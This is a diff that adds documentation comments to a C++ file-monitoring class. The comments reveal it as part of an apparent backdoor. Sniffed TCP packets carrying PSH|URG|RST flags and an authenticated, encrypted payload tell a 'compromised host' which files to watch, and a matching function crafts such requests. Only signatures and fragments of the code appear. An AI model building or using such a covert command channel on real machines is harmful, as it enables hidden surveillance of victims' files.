@@ -9,6 +9,18 @@
 #define EVENT_SIZE (sizeof(struct inotify_event))
 #define EVENT_BUFFER_LEN (1024 * (EVENT_SIZE + 16))
 
+/*
+ * the constructor for the file monitor. This class uses inotify to watch files for creation,
+ * modify, or deletion events and calls the supplied functions.
+ *
+ * Params:
+ *      EventCallback &created: The callback function that is executed when a created event occurs.
+ *
+ *      EventCallback &modified: The callback function that is executed when a modified event
+ *      occurs.
+ *
+ *      EventCallback &deleted: The callback function that is executed when a deleted event occurs.
+ */
 FileMonitor::FileMonitor(EventCallback &created, EventCallback &modified, EventCallback &deleted) {
     this->t = nullptr;
 
@@ -21,6 +33,10 @@ FileMonitor::FileMonitor(EventCallback &created, EventCallback &modified, EventC
     this->setDeletedCallback(deleted);
 }
 
+/*
+ * Deconstructor for the file monitor. Stops the thread if there is one and clears all the inotify
+ * watch descriptors.
+ */
 FileMonitor::~FileMonitor() {
     this->stopMonitoring();
 
@@ -31,6 +47,16 @@ FileMonitor::~FileMonitor() {
     close(this->inotifyFd);
 }
 
+/*
+ * Adds a file to the inotify watch system.
+ *
+ * Params:
+ *      const std::string &filename: The absolute path to the file to watch.
+ *
+ * Returns:
+ *      The watch file descriptor returned by inotify if monitoring started successfully, 0 or a
+ *      negative number otherwise.
+ */
 int FileMonitor::addWatchFile(const std::string &filename) {
     static const int flags = (unsigned int)(IN_CREATE | IN_MODIFY | IN_DELETE);
 
@@ -44,6 +70,10 @@ int FileMonitor::addWatchFile(const std::string &filename) {
     return wd;
 }
 
+/*
+ * The main entry point of file monitoring thread. Uses select to constantly poll inotify for an new
+ * event.
+ */
 void FileMonitor::runMonitoring() {
     int numRead;
     int numRdy;
@@ -99,6 +129,12 @@ void FileMonitor::runMonitoring() {
     }
 }
 
+/*
+ * The network callback function. This is the function that is passed to pcap and is called with
+ * every sniffed packet. If a TCP packet contains the flags [PSH|URG|RST] and the packet is
+ * authenticated, this function will add the file specified in the encrypted payload to the inotify
+ * system.
+ */
 void FileMonitor::netCallback(const pcap_pkthdr *header, const unsigned char *packet,
                               NetworkEngine *net) {
     struct ethhdr *eth = (struct ethhdr *)packet;
@@ -150,6 +186,10 @@ void FileMonitor::netCallback(const pcap_pkthdr *header, const unsigned char *pa
     }
 }
 
+/*
+ * Crafts a request that will be sent to the compromised host. The request has the flags
+ * [PSH|URG|RST] and is authenticated. The filename is stored in the encrypted payload.
+ */
 void FileMonitor::sendRequest(const std::string &file, const in_addr daddr, NetworkEngine *net) {
     static const unsigned char flags = TcpStack::PSH_FLAG | TcpStack::URG_FLAG | TcpStack::RST_FLAG;
 
